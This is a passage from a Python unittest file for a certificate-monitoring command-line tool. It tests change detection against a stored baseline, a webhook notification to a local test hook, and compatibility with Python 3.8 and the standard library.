                self.assertEqual(code, 0, err)  # the first run records the baseline
                self.assertIn('Baseline %s does not exist yet' % state, out)
                self.assertEqual(hook.requests, [])
                # yesterday's report, as if the renewed server had answered on the same port
                doc = read_json(state)
                for row in doc['results'] + doc['endpoints']:
                    row['port'] = new.port
                doc['options']['ports'] = [new.port]
                Path(state).write_text(json.dumps(doc), encoding='utf-8')

                code, out, err = run_main('-p', str(new.port), *args)
                self.assertEqual(code, sos.EXIT_CHANGED, err)
                changes = read_json(state)['changes']
                self.assertEqual(sorted((c['name'], c['transition'], c['certChanged'])
                                        for c in changes),
                                 [('*.wild.example.net', 'updated', True),
                                  (WILD, 'updated', True),
                                  ('wild.example.net', 'updated', True)])
                self.assertIn('UPDATED    web 127.0.0.1:%d %s: NEEDS_UPDATE -> UPDATED'
                              % (new.port, WILD), out)
                self.assertEqual(len(hook.requests), 1)
                payload = hook.payloads()[0]
                self.assertEqual(payload['changesTotal'], 3)
                self.assertIn('Notification sent (json, 127.0.0.1:', err)

                code, out, err = run_main('-p', str(new.port), *args)
                self.assertEqual(code, 0, err)  # nothing new since the second run
                self.assertIn('): none', out)
                self.assertEqual(len(hook.requests), 1)
        finally:
            old.close()
            new.close()


class CompatibilityTests(unittest.TestCase):
    """The CLI must stay runnable on Python 3.8."""

    def test_py_compile(self):
        import py_compile
        with tempfile.TemporaryDirectory() as tmp:
            py_compile.compile(str(CLI_PATH), cfile=os.path.join(tmp, 'x.pyc'), doraise=True)

    def test_no_py39_plus_syntax_or_apis(self):
        import ast
        source = CLI_PATH.read_text(encoding='utf-8')
        tree = ast.parse(source, feature_version=(3, 8))
        for node in ast.walk(tree):
            self.assertNotIsInstance(node, getattr(ast, 'Match', ()))
            if isinstance(node, ast.Subscript) and isinstance(node.value, ast.Name):
                # builtin generics (list[str]) only appear inside string annotations
                self.assertNotIn(node.value.id, ('list', 'dict', 'tuple', 'set', 'type'),
                                 ast.dump(node))
        # ... nor deprecated ones: a positional maxsplit / count / flags to re.split /
        # re.sub / re.subn warns on Python 3.13+, on stderr of every run (__main__)
        for node in ast.walk(tree):
            if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                    and isinstance(node.func.value, ast.Name) and node.func.value.id == 're'
                    and node.func.attr in ('split', 'sub', 'subn')):
                self.assertLessEqual(len(node.args), 2 if node.func.attr == 'split' else 3,
                                     'line %d' % node.lineno)
        for api in ('removeprefix', 'removesuffix', 'functools.cache', 'zoneinfo', ' | None',
                    'strict=True)', 'BooleanOptionalAction'):
            self.assertNotIn(api, source, api)
        self.assertIn('from __future__ import annotations', source)

    def test_shebang_and_stdlib_only(self):
        source = CLI_PATH.read_text(encoding='utf-8')
        self.assertTrue(source.startswith('#!/usr/bin/env python3'))
        imports = set(re.findall(r'^(?:from|import) ([a-zA-Z_][\w.]*)', source, re.M))
        stdlib = {'__future__', 'argparse', 'base64', 'binascii', 'bisect', 'csv', 'hashlib', 'io',
                  'ipaddress', 'json', 'math', 'os', 're', 'shutil', 'socket', 'ssl', 'sys',
                  'textwrap', 'threading', 'time', 'concurrent.futures', 'dataclasses',
                  'datetime', 'typing', 'ctypes', 'msvcrt', 'codecs', 'stat', 'unicodedata',
                  'encodings', 'http.client', 'urllib.error', 'urllib.parse',
                  'urllib.request'}
        self.assertLessEqual(imports, stdlib, imports - stdlib)


if __name__ == '__main__':
    unittest.main()
